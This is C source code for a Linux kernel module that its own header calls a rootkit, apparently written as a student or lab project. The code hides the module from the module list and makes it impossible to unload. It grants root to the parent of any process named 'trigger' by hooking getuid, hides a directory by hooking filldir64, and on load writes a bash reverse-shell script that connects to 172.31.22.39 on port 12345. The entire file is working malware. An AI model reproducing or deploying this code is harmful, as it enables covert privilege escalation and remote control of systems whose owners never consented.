#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor, Marouane, Mina, Axel");
MODULE_DESCRIPTION("Rootkit -> Privilege escalation, hiding directory, and LKM hiding");
MODULE_VERSION("0.01");

// Function prototypes
void showme(void);
void hideme(void);
void protect(void);
void unprotect(void);
static void set_root(void);

// Hide LKM variables and functions
static struct list_head *prev_module;
static short hidden = 0;

// Privilege escalation variables and functions
static struct kprobe kp_getuid;
static struct kprobe kp_filldir64;

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

int is_protected = 0;

void protect(void)
{
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);
    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);
    is_protected = 0;
}

static void set_root(void)
{
    struct cred *new_creds;
    struct task_struct *parent_task;

    // Get the parent process
    parent_task = current->real_parent;

    // Prepare new credentials
    new_creds = prepare_creds();
    if (new_creds == NULL) {
        printk(KERN_ALERT "rootkit: Unable to prepare credentials.\n");
        return;
    }

    // Set the new credentials to root
    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    // Commit the new credentials to the parent process
    if (parent_task) {
        task_lock(parent_task); // Lock to modify safely
        parent_task->real_cred = new_creds;
        parent_task->cred = new_creds;
        task_unlock(parent_task); // Unlock after modification
    } else {
        printk(KERN_ALERT "rootkit: Parent task not found.\n");
    }

    printk(KERN_INFO "rootkit: Parent process privileges escalated successfully.\n");
}

static int handler_pre_getuid(struct kprobe *p, struct pt_regs *regs)
{
    const char *target_cmd = "trigger";
    char comm[TASK_COMM_LEN];

    get_task_comm(comm, current);

    if (strcmp(comm, target_cmd) == 0) {
        // printk(KERN_INFO "rootkit: Granting root privileges for process %s...\n", comm);
        set_root();
    }

    return 0;
}

static void handler_post_getuid(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    if (regs->si == 0) {
        regs->ax = 0;
    }
}

static int handler_pre_filldir64(struct kprobe *p, struct pt_regs *regs)
{
    char *dir = (char *)regs->si;
    int ret;
    // printk(KERN_INFO "rootkit: filldir64 called with dir: %s\n", dir);

    if ((ret = strcmp(dir, "111111111111111111111111111")) == 0) {
        regs->dx = 0;
    }
    return 0;
}

static int lkm_file_create_init(void) {
    struct file *trigger_file, *revshell_file;
    loff_t pos_trigger = 0, pos_revshell = 0;
    char *trigger_content = "#!/bin/bash\n";
    char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
    ssize_t written;

    printk(KERN_INFO "LKM: Initialisation du module.\n");

    // Crée et ouvre le premier fichier
    trigger_file = filp_open("/root/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(trigger_file)) {
        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /root/trigger.\n");
        return PTR_ERR(trigger_file);
    }

    // Écrit dans le premier fichier
    written = kernel_write(trigger_file, trigger_content, strlen(trigger_content), &pos_trigger);
    if (written < 0) {
        printk(KERN_ERR "LKM: Échec de l'écriture dans /root/trigger.\n");
        filp_close(trigger_file, NULL);
        return written;
    }
    printk(KERN_INFO "LKM: Écriture réussie dans /root/trigger.\n");
    filp_close(trigger_file, NULL);

    // Crée et ouvre le second fichier
    revshell_file = filp_open("/root/revshell.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(revshell_file)) {
        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /root/revshell.sh.\n");
        return PTR_ERR(revshell_file);
    }

    // Écrit dans le second fichier
    written = kernel_write(revshell_file, revshell_content, strlen(revshell_content), &pos_revshell);
    if (written < 0) {
        printk(KERN_ERR "LKM: Échec de l'écriture dans /root/revshell.sh.\n");
        filp_close(revshell_file, NULL);
        return written;
    }
    printk(KERN_INFO "LKM: Écriture réussie dans /root/revshell.sh.\n");
    filp_close(revshell_file, NULL);

    return 0;
}

// Module initialization and cleanup
static int __init rootkit_init(void)
{
    int ret;

    hideme();
    protect();
    lkm_file_create_init();

    // Privilege escalation
    kp_getuid.symbol_name = "__x64_sys_getuid";
    kp_getuid.pre_handler = handler_pre_getuid;
    kp_getuid.post_handler = handler_post_getuid;

    ret = register_kprobe(&kp_getuid);
    if (ret < 0) {
        // printk(KERN_ERR "rootkit: Failed to register kprobe for getuid, returned %d\n", ret);
        return ret;
    }

    // printk(KERN_INFO "rootkit: Kprobe registered at %s\n", kp_getuid.symbol_name);

    // File hiding
    kp_filldir64.symbol_name = "filldir64";
    kp_filldir64.pre_handler = handler_pre_filldir64;

    ret = register_kprobe(&kp_filldir64);
    if (ret < 0) {
        // printk(KERN_ERR "rootkit: Failed to register kprobe for filldir64, returned %d\n", ret);
        unregister_kprobe(&kp_getuid);
        return ret;
    }

    // printk(KERN_INFO "rootkit: Kprobe registered at %s and %s \n", kp_filldir64.symbol_name, kp_getuid.symbol_name);

    return 0;
}

static void __exit rootkit_exit(void)
{
    // Unregister kprobes
    unregister_kprobe(&kp_getuid);
    // printk(KERN_INFO "rootkit: Kprobe for getuid unregistered\n");

    unregister_kprobe(&kp_filldir64);
    // printk(KERN_INFO "rootkit: Kprobe for filldir64 unregistered\n");

    // Show LKM
    showme();
    unprotect();
}

module_init(rootkit_init);
module_exit(rootkit_exit);